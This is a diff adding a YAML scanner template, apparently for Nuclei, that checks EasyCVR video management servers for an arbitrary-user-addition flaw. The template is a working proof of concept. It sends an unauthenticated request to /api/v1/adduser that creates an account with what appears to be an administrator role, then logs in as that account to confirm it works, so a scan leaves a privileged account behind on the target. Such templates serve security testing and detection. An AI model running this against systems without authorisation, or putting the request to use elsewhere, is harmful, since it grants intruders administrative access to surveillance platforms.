@@ -1,0 +1,47 @@
+id: poc-yaml-easy-cvr-adduser-any-user-add
+info:
+  name: EasyCVR视频管理平台 adduser 任意用户添加漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: access-control,authorization
+  description: |
+    This template detects a vulnerability in EasyCVR that allows arbitrary user addition due to insufficient access control.
+
+variables:
+  user: '{{rand_text_alphanumeric(5)}}'
+  password: '{{md5(rand_text_alphanumeric(8))}}'
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: add-user
+    method: POST
+    path:
+      - "{{BaseURL}}/api/v1/adduser"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: 'name={{user}}&username={{user}}&password={{password}}&roleid=1'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "success"
+
+  - id: login-user
+    method: GET
+    path:
+      - "{{BaseURL}}/api/v1/login?_t=1716345889&username={{user}}&password={{password}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Success OK"
+          - "Token"
+          - "{{user}}"
